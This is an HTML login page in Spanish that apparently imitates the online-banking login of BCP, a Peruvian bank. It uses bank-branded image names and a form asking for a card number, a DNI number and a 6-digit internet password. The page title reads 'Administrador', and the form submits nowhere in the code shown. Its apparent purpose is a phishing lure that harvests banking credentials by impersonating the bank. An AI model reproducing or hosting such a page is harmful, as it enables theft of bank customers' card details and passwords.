<!DOCTYPE html>
<html lang="es">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login | Administrador</title>
  <link href="style_login.css" rel="stylesheet">
</head>

<body>
  <main>
    <!-- <?php // include 'modals/alerta_dispositivo.php' ?> -->
    <div class="logo"><img src="img/loguito.png" alt="logo_bcp.jpg"></div>
    <div class="flex">
      <!--Cambiar image-->
      <div class="img_trabajador"><img src="img/trabajador_bcp.jpg" alt="imagen_login.jpg"></img></div>
      <div class="iniciar_sesion">
        <h1>Ingresa a tu banca en linea</h1>
        <form action="#">
          <div>
            <input type="text" placeholder="Numero de tarjeta de debido o credito">
          </div>
          <div class="group">
            <input class="only_text" disabled value="DNI"/>
            <input type="text" placeholder="Nº de Documento">
          </div>
          <div>
            <input type="password" placeholder="Clave de internet de 6 digitos">
          </div>
          <button type="submit">Ingresar</button>
        </form>
      </div>
    </div>
  </main>
</body>

</html>